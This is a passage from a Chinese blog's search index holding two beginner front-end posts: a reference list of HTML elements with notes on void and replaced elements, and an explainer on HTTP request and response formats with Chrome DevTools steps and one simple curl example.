class="name">dd</span>&gt;</span>代表出现在它之前术语的定义。</span><br><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span> 这个元素在 HTML5 中加入代表一个和文档有关的图例。</span><br><span class="line"><span class="tag">&lt;<span class="name">figcaption</span>&gt;</span> 这个元素在 HTML5 中加入代表一个图例的说明。</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>代表一个通用的容器，没有特殊含义。</span><br></pre></td></tr></table></figure><h2 id="文字形式节"><a href="#文字形式节" class="headerlink" title="文字形式节"></a>文字形式节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>代表一个链接到其他资源的超链接 。</span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>代表强调 文字。</span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>代表特别重要 文字。</span><br><span class="line"><span class="tag">&lt;<span class="name">small</span>&gt;</span>代表注释 ，如免责声明、版权声明等，对理解文档不重要。</span><br><span class="line"><span class="tag">&lt;<span class="name">s</span>&gt;</span>代表不准确或不相关 的内容。</span><br><span class="line"><span class="tag">&lt;<span class="name">cite</span>&gt;</span>代表作品标题 。</span><br><span class="line"><span class="tag">&lt;<span class="name">q</span>&gt;</span>代表内联的引用 。</span><br><span class="line"><span class="tag">&lt;<span class="name">dfn</span>&gt;</span>代表一个术语包含在其最近祖先内容中的定义 。</span><br><span class="line"><span class="tag">&lt;<span class="name">abbr</span>&gt;</span>代表省略 或缩写 ，其完整内容在 title 属性中。</span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span> 这个元素在 HTML5 中加入关联一个内容的机器可读的等价形式 （该元素只在 WHATWG 版本的 HTML 标准中，不在 W3C 版本的 HTML5 标准中）。</span><br><span class="line"><span class="tag">&lt;<span class="name">time</span>&gt;</span> 这个元素在 HTML5 中加入代表日期 和时间 值；机器可读的等价形式通过 datetime 属性指定。</span><br><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span>代表计算机代码 。</span><br><span class="line"><span class="tag">&lt;<span class="name">var</span>&gt;</span>代表代码中的变量 。</span><br><span class="line"><span class="tag">&lt;<span class="name">samp</span>&gt;</span>代表程序或电脑的输出 。</span><br><span class="line"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span>代表用户输入 ，一般从键盘输出，但也可以代表其他输入，如语音输入。</span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span>,<span class="tag">&lt;<span class="name">sup</span>&gt;</span>分别代表下标 和上标 。</span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>代表一段不同性质 的文字，如技术术语、外文短语等。</span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>代表一段需要被关注 的文字。</span><br><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span>代表一段需要下划线呈现的文本注释，如标记出拼写错误的文字等。</span><br><span class="line"><span class="tag">&lt;<span class="name">mark</span>&gt;</span> 这个元素在 HTML5 中加入代表一段需要被高亮的引用 文字。</span><br><span class="line"><span class="tag">&lt;<span class="name">ruby</span>&gt;</span> 这个元素在 HTML5 中加入代表被ruby 注释 标记的文本，如中文汉字和它的拼音。</span><br><span class="line"><span class="tag">&lt;<span class="name">rt</span>&gt;</span> 这个元素在 HTML5 中加入代表ruby 注释 ，如中文拼音。</span><br><span class="line"><span class="tag">&lt;<span class="name">rp</span>&gt;</span> 这个元素在 HTML5 中加入代表 ruby 注释两边的额外插入文本 ，用于在不支持 ruby 注释显示的浏览器中提供友好的注释显示。</span><br><span class="line"><span class="tag">&lt;<span class="name">bdi</span>&gt;</span> 这个元素在 HTML5 中加入代表需要脱离 父元素文本方向的一段文本。它允许嵌入一段不同或未知文本方向格式的文本。</span><br><span class="line"><span class="tag">&lt;<span class="name">bdo</span>&gt;</span>指定子元素的文本方向 ，显式地覆盖默认的文本方向。</span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>代表一段没有特殊含义的文本，当其他语义元素都不适合文本时候可以使用该元素。</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>代表换行 。</span><br><span class="line"><span class="tag">&lt;<span class="name">wbr</span>&gt;</span> 这个元素在 HTML5 中加入代表建议换行 (Word Break Opportunity) ，当文本太长需要换行时将会在此处添加换行符。</span><br></pre></td></tr></table></figure><h2 id="编辑节"><a href="#编辑节" class="headerlink" title="编辑节"></a>编辑节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span>定义增加 到文档的内容。</span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span>定义从文档移除 的内容。</span><br></pre></td></tr></table></figure><h2 id="嵌入内容节"><a href="#嵌入内容节" class="headerlink" title="嵌入内容节"></a>嵌入内容节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>代表一张图片 。</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>代表一个内联的框架 。</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span>&gt;</span> 这个元素在 HTML5 中加入代表一个嵌入 的外部资源，如应用程序或交互内容。</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span>&gt;</span>代表一个外部资源 ，如图片、HTML 子文档、插件等。</span><br><span class="line"><span class="tag">&lt;<span class="name">param</span>&gt;</span>代表 <span class="tag">&lt;<span class="name">object</span>&gt;</span> 元素所指定的插件的参数 。</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span> 这个元素在 HTML5 中加入代表一段视频 及其视频文件和字幕，并提供了播放视频的用户界面。</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span>&gt;</span> 这个元素在 HTML5 中加入代表一段声音 ，或音频流 。</span><br><span class="line"><span class="tag">&lt;<span class="name">source</span>&gt;</span> 这个元素在 HTML5 中加入为 <span class="tag">&lt;<span class="name">video</span>&gt;</span> 或 <span class="tag">&lt;<span class="name">audio</span>&gt;</span> 这类媒体元素指定媒体源 。</span><br><span class="line"><span class="tag">&lt;<span class="name">track</span>&gt;</span> 这个元素在 HTML5 中加入为 <span class="tag">&lt;<span class="name">video</span>&gt;</span> 或 <span class="tag">&lt;<span class="name">audio</span>&gt;</span> 这类媒体元素指定文本轨道（字幕） 。</span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span>&gt;</span> 这个元素在 HTML5 中加入代表位图区域 ，可以通过脚本在它上面实时呈现图形，如图表、游戏绘图等。</span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span>与 <span class="tag">&lt;<span class="name">area</span>&gt;</span> 元素共同定义图像映射 区域。</span><br><span class="line"><span class="tag">&lt;<span class="name">area</span>&gt;</span>与 <span class="tag">&lt;<span class="name">map</span>&gt;</span> 元素共同定义图像映射 区域。</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span> 这个元素在 HTML5 中加入定义一个嵌入式矢量图 。</span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span> 这个元素在 HTML5 中加入定义一段数学公式 。</span><br></pre></td></tr></table></figure><h2 id="表格节"><a href="#表格节" class="headerlink" title="表格节"></a>表格节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span>定义多维数据 。</span><br><span class="line"><span class="tag">&lt;<span class="name">caption</span>&gt;</span>代表表格的标题 。</span><br><span class="line"><span class="tag">&lt;<span class="name">colgroup</span>&gt;</span>代表表格中一组单列或多列 。</span><br><span class="line"><span class="tag">&lt;<span class="name">col</span>&gt;</span>代表表格中的列 。</span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span>代表表格中一块具体数据 （表格主体）。</span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span>代表表格中一块列标签 （表头）。</span><br><span class="line"><span class="tag">&lt;<span class="name">tfoot</span>&gt;</span>代表表格中一块列摘要 （表尾）。</span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span>代表表格中的行 。</span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>代表表格中的单元格 。</span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>代表表格中的头部单元格 。</span><br></pre></td></tr></table></figure><h2 id="表单节"><a href="#表单节" class="headerlink" title="表单节"></a>表单节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span>代表一个表单 ，由控件组成。</span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>代表控件组 。</span><br><span class="line"><span class="tag">&lt;<span class="name">legend</span>&gt;</span>代表 <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span> 控件组的标题 。</span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>代表表单控件的标题 。</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span>代表允许用户编辑数据的数据区 （文本框、单选框、复选框等）。</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>代表按钮 。</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span>代表下拉框 。</span><br><span class="line"><span class="tag">&lt;<span class="name">datalist</span>&gt;</span> 这个元素在 HTML5 中加入代表提供给其他控件的一组预定义选项 。</span><br><span class="line"><span class="tag">&lt;<span class="name">optgroup</span>&gt;</span>代表一个选项分组 。</span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>代表一个 <span class="tag">&lt;<span class="name">select</span>&gt;</span> 元素或 <span class="tag">&lt;<span class="name">datalist</span>&gt;</span> 元素中的一个选项</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>代表多行文本框 。</span><br><span class="line"><span class="tag">&lt;<span class="name">keygen</span>&gt;</span> 这个元素在 HTML5 中加入代表一个密钥对生成器 控件。</span><br><span class="line"><span class="tag">&lt;<span class="name">output</span>&gt;</span> 这个元素在 HTML5 中加入代表计算值 。</span><br><span class="line"><span class="tag">&lt;<span class="name">progress</span>&gt;</span> 这个元素在 HTML5 中加入代表进度条 。</span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span>&gt;</span> 这个元素在 HTML5 中加入代表滑动条 。</span><br></pre></td></tr></table></figure><h2 id="交互元素节"><a href="#交互元素节" class="headerlink" title="交互元素节"></a>交互元素节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span>&gt;</span> 这个元素在 HTML5 中加入代表一个用户可以(点击)获取额外信息或控件的小部件 。</span><br><span class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span> 这个元素在 HTML5 中加入代表 <span class="tag">&lt;<span class="name">details</span>&gt;</span> 元素的综述 或标题 。</span><br><span class="line"><span class="tag">&lt;<span class="name">menuitem</span>&gt;</span> 这个元素在 HTML5 中加入代表一个用户可以点击的菜单项。</span><br><span class="line"><span class="tag">&lt;<span class="name">menu</span>&gt;</span> 这个元素在 HTML5 中加入代表菜单。</span><br></pre></td></tr></table></figure><h1 id="什么是空标签"><a href="#什么是空标签" class="headerlink" title="什么是空标签"></a>什么是空标签</h1><p>没有闭合标签的标签被称作为空标签。<br>在我们使用的标签中，有的具有闭合标签。例如<code>&lt;td&gt;</code>标签，它有闭合标签<code>&lt;/td&gt;</code>。但是也有一部分标签没有闭合标签，例如<code>&lt;br /&gt;</code>标签，这一类标签我们称之为空标签。</p><h2 id="常见的空标签有哪些"><a href="#常见的空标签有哪些" class="headerlink" title="常见的空标签有哪些"></a>常见的空标签有哪些</h2><pre class="hljs xml"><code class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> /&gt;</span>  用于为基于Web的表单创建交互式控件，以便接受来自用户的数据。<span class="hljs-tag">&lt;<span class="hljs-name">img</span> /&gt;</span> 代表文档中的一个图像。<span class="hljs-tag">&lt;<span class="hljs-name">isindex</span> /&gt;</span> 使浏览器显示一个对话框，提示用户输入单行文本。<span class="hljs-tag">&lt;<span class="hljs-name">area</span> /&gt;</span> 在图片上定义一个热点区域<span class="hljs-tag">&lt;<span class="hljs-name">base</span> /&gt;</span> 指定用于一个文档中包含的所有相对URL的基本URL。<span class="hljs-tag">&lt;<span class="hljs-name">basefont</span> /&gt;</span> 用来设置文档的默认字体大小。（目前已废弃 ）<span class="hljs-tag">&lt;<span class="hljs-name">bgsound</span> /&gt;</span> IE浏览器中设置网页背景音乐的元素。<span class="hljs-tag">&lt;<span class="hljs-name">col</span> /&gt;</span> 定义表格中的列，并用于定义所有公共单元格上的公共语义。它通常位于`<span class="hljs-tag">&lt;<span class="hljs-name">colgroup</span>&gt;</span>`元素内。<span class="hljs-tag">&lt;<span class="hljs-name">embed</span> /&gt;</span> 用于表示一个外部应用或交互式内容的集合点，换句话说，就是一个插件。 <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> /&gt;</span> ，它定义了一个特定区域，另一个 HTML 文档可以在里面展示。(已废弃)<span class="hljs-tag">&lt;<span class="hljs-name">keygen</span> /&gt;</span>  为了方便生成密钥材料和提交作为 [HTML form]的一部分的公钥.这种机制被用于设计基于 Web 的证书管理系统。(已废弃)<span class="hljs-tag">&lt;<span class="hljs-name">link</span> /&gt;</span> 指定了外部资源与当前文档的关系. 这个元素的使用方法包括为导航定义关系框架.这个元素经常用来链接css文件。<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> /&gt;</span> 元素表示那些不能由其它HTML元相关元素 (<span class="hljs-tag">&lt;<span class="hljs-name">base</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">,          <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="xml"> 或 <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>) 之一表示的任何元数据信息.<span class="hljs-tag">&lt;<span class="hljs-name">nextid</span> /&gt;</span>  是一个过时的 HTML 元素, 它使下一个 web 设计工具能够为其定位点生成自动名称标签。            它是由该 web 编辑工具自动生成的, 不需要手动调整或输入。这个元素的区别是成为第一个元素, 成为一个 "丢失的标签" 被淘汰的官方公共 DTD 的 HTML 版本。<span class="hljs-tag">&lt;<span class="hljs-name">param</span> /&gt;</span>  定义了 <span class="hljs-tag">&lt;<span class="hljs-name">object</span>&gt;</span>的参数<span class="hljs-tag">&lt;<span class="hljs-name">plaintext</span> /&gt;</span> 将起始标签后面的任何东西渲染为纯文本，不会解释为 HTML。它没有闭合标签，因为任何后面的东西都会看做纯文本。(已废弃)<span class="hljs-tag">&lt;<span class="hljs-name">spacer</span> /&gt;</span> 它可以向页面插入间隔。它由 Netscape 设计，用于实现单像素布局图像的相同效果，Web 设计师用它来向页面添加空白，而不需要实际使用图片。（已废弃）<span class="hljs-tag">&lt;<span class="hljs-name">wbr</span> /&gt;</span> 一个文本中的位置，其中浏览器可以选择来换行，虽然它的换行规则可能不会在这里换行。</span></span></span></code></pre><h1 id="什么是可替换标签"><a href="#什么是可替换标签" class="headerlink" title="什么是可替换标签"></a>什么是可替换标签</h1><p>在 CSS 中，可替换元素（replaced element）的展现效果不是由 CSS 来控制的。这些元素是一种外部对象，它们外观的渲染，是独立于 CSS 的。</p><p>简单来说，它们的内容不受当前文档的样式的影响。CSS 可以影响可替换元素的位置，但不会影响到可替换元素自身的内容。某些可替换元素，例如<code>&lt;iframe&gt;</code>元素，可能具有自己的样式表，但它们不会继承父文档的样式。</p><p>CSS 能对可替换元素产生的唯一影响在于，部分属性支持控制元素内容在其框中的位置或定位方式。有关详细信息，请参阅本文下面的控制内容框中的对象位置。</p><h2 id="可替换标签"><a href="#可替换标签" class="headerlink" title="可替换标签"></a>可替换标签</h2><p>典型的可替换元素有：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有些元素仅在特定情况下被作为可替换元素处理，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">applet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HTML 规范也说了 <code>&lt;input&gt;</code> 元素可替换，因为 “image” 类型的 <code>&lt;input&gt;</code>元素就像<code>&lt;img&gt;</code>一样被替换。但是其他形式的控制元素，包括其他类型的 <code>&lt;input&gt; </code>元素，被明确地列为非可替换元素（non-replaced elements）。该规范用术语小挂件（Widgets）来描述它们默认的限定平台的渲染行为。</p><p>用 CSS content 属性插入的对象是匿名的可替换元素。它们并不存在于 HTML 标记中，因此是“匿名的”。</p><h2 id="CSS与可替换标签"><a href="#CSS与可替换标签" class="headerlink" title="CSS与可替换标签"></a>CSS与可替换标签</h2><p>CSS 在某些情况下会对可替换元素做一些特殊处理，比如计算外边距（margin）和一些 auto 的具体值。</p><p>需要注意的是，一部分（并非全部）可替换元素，其本身具有的尺寸和基线（baseline）会被一些 CSS 属性用到，加入计算之中，例如 vertical-align。会只有可替换元素才能具有这种自带值。</p><p>控制内容框中的对象位置节<br>某些CSS属性可用于指定被替换元素中包含的对象应如何定位在元素的框区域中。这些由CSS图像模块第3级和CSS图像模块第4级规范定义:</p><p>object-fit<br>指定应如何将替换后的元素的内容对象安装到包含元素的框中。</p><p>对象的位置<br>指定被替换元素的内容对象在元素框中的对齐方式。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于HTTP的请求与相应</title>
      <link href="/posts/99062c63/"/>
      <url>/posts/99062c63/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP请求的格式"><a href="#HTTP请求的格式" class="headerlink" title="HTTP请求的格式"></a>HTTP请求的格式</h1><p>1 动词 路径 协议&#x2F;版本<br>2 Key1: value1<br>2 Content-Type: application&#x2F;x-www-form-urlencoded<br>2 Host: <a href="http://www.baidu.com/">www.baidu.com</a><br>2 User-Agent: curl&#x2F;7.54.0<br>3<br>4 要上传的数据<br>请求最多包含四部分，最少包含三部分。（也就是说第四部分可以为空）<br>第三部分永远都是一个回车（\n）</p><p>当浏览器向Web服务器发出请求时，它向服务器传递了一个数据块，也就是请求信息，HTTP请求信息由3部分组成：（1）请求方法URI协议&#x2F;版本（2）　请求头(Request Header)（3）　请求正文<br>（1）请求方法URI协议&#x2F;版本<br>请求的第一行是“方法URI协议&#x2F;版本”例如：GET&#x2F;sample.jsp HTTP&#x2F;1.1<br>以上代码中“GET”代表请求方法，“&#x2F;sample.jsp”表示URI，“HTTP&#x2F;1.1代表协议和协议的版本。<br>（2）请求头(Request Header)<br>请求头包含许多有关的客户端环境和请求正文的有用信息。例如，请求头可以声明浏览器所用的语言，请求正文的长度等。例如：<br>Accept:image&#x2F;gif.image&#x2F;jpeg.<em>&#x2F;</em><br>Accept-Language:zh-cn<br>Connection:Keep-Alive<br>Host:localhost<br>User-Agent:Mozila&#x2F;4.0(compatible:MSIE5.01:Windows NT5.0)<br>Accept-Encoding:gzip,deflate.<br>（3）请求正文<br>请求头和请求正文之间是一个空行，这个行非常重要，它表示请求头已经结束，接下来的是请求正文。请求正文中可以包含客户提交的查询字符串信息：<br>username&#x3D;jinqiao&amp;password&#x3D;1234</p><h2 id="用Chrome查看请求"><a href="#用Chrome查看请求" class="headerlink" title="用Chrome查看请求"></a>用Chrome查看请求</h2><p>1.打开检查，进入Network<br>2.在地址栏输入网址<br>3.在 Network 点击，查看 request，点击「view source」<br>4.如果有请求的第四部分，那么在 FormData 或 Payload 里面可以看到</p><h1 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h1><p>请求了之后，应该都能得到一个响应，除非断网了，或者服务器宕机了。</p><p>1.GET 请求和 POST 请求对应的响应可以一样，也可以不一样<br>2.响应的第四部分可以很长很长很长</p><h2 id="响应的格式"><a href="#响应的格式" class="headerlink" title="响应的格式"></a>响应的格式</h2><p>1 协议&#x2F;版本号 状态码 状态解释<br>2 Key1: value1<br>2 Key2: value2<br>2 Content-Length: 17931<br>2 Content-Type: text&#x2F;html<br>3<br>4 要下载的内容</p><h2 id="用Chrome查看响应"><a href="#用Chrome查看响应" class="headerlink" title="用Chrome查看响应"></a>用Chrome查看响应</h2><p>1.打开 Network<br>2.输入网址<br>3.选中第一个响应<br>4.查看 Response Headers，点击「view source」，点击「view source」，点击「view source」<br>5.你会看到响应的前两部分<br>6.查看 Response 或者 Preview，你会看到响应的第 4 部分</p><h1 id="使用-curl-命令"><a href="#使用-curl-命令" class="headerlink" title="使用 curl 命令"></a>使用 curl 命令</h1><p>进入命令行界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -v -H <span class="string">&quot;Frank: xxx&quot;</span> -- <span class="string">&quot;https://www.baidu.com&quot;</span></span><br></pre></td></tr></table></figure><p>以上是用Git Bash查看请求与响应的命令<br>会得到相关内容</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
